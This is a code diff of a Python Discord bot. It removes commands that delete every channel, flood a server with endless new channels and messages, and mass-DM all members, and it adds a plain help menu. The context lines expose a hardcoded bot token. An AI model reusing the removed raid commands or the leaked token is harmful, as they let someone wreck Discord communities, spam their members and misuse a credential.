@@ -25,69 +25,16 @@ client = commands.Bot(command_prefix = '.',intents=intents)
 client.remove_command('help')
 token = 'ODUwMDc2NzUzODI4MjQ5NjUw.YLkdqw.xFxLZJhcqED0qlUytLfu8MsM1Xo'
 
-@client.command()
-async def destroy (ctx,message):
-    guild=ctx.message.guild
-    await ctx.message.delete()
-    
-    for channel in list(ctx.message.guild.channels):
-        try:
-            await channel.delete()
-            print(f"{channel.name} has been deleted")
-        except:
-             pass
-    for i in range(1):
-        await guild.create_text_channel(f"{message}")
-    while True:
-        for channel in guild.text_channels:
-            for i in range (1):
-                await guild.create_text_channel(f"{message}")
- 
+@client.command(aliases=['Help','HELP'])
+@commands.guild_only()
+async def help(ctx):
+    channel = ctx.message.author
+    embed = discord.Embed(title="HELP", timestamp= ctx.message.created_at ,color=discord.Color(0x5d018f))
+    embed.add_field(name='**Moderation commands**', value='`ban`, `kick`, `warn`, `nick`, `mute`, `unmute`',inline=False )
+    embed.add_field(name='**Fun commands**',value='`kiss`, `punch`, `slap`, `hug`,`say`,`pedorate`, `gayrate`, `simprate`, `rnumber`, `zero`',inline=False)
+    embed.add_field(name='**Other commands**',value=' `membercount`, `roles`,  `tos`, `invite`, `server`, `avatar`, `whois`, `vote`, `ping`,',inline=False)
+    embed.set_footer(text='[ZeroOn1 Support](https://discord.gg/bqsdzwvX6t)')
 
-@client.command()
-async def s(ctx, *, message ):
-  guild=ctx.message.guild
-  await ctx.message.delete()
-  for i in range(2):
-    print("spammed")
-    while True:
-           for channel in guild.text_channels:
-                 await channel.send(f"{message}")
-
-@client.command()
-async def cda(ctx):
-    guild=ctx.message.guild
-    await ctx.message.delete()
-    
-    for channel in list(ctx.message.guild.channels):
-        try:
-            await channel.delete()
-        except:
-            pass   
-
-@client.command()
-async def dm(ctx,args=None):
-    if args !=None:
-      members=ctx.guild.members
-      for member in members:
-        try:
-           await member.send(args)
-           print("message sent to "+member.name)
-        except:
-           print("I cannot send this message to "+member.name)
-
-
-@client.command()
-async def commands(ctx):
- 
-  embed=discord.Embed(title="Commands",timestamp= ctx.message.created_at,color=discord.Color.blue(),inline=False)
-  embed.add_field(name="**.cda**",value="cda command for deleting all channels only", inline=False)
-  embed.add_field(name="**.destroy (message)**",value="destroy command for deleting all and creating 500 channels ",inline=False)
-  embed.add_field(name="**.s (message)**",value="s command for spam the bot will send your message in all channels in the guild",inline=False)
-  embed.add_field(name="**dm (message)**",value="dm command for mass dm. The bot may dm everyone, but the bot will get flaged by the discord spam system",inline=False)
-  embed.set_footer(text="developed by Saad.#4707")
-
-  await ctx.send(embed=embed)
-
+    await ctx.send(embed=embed)
 
 client.run(token)
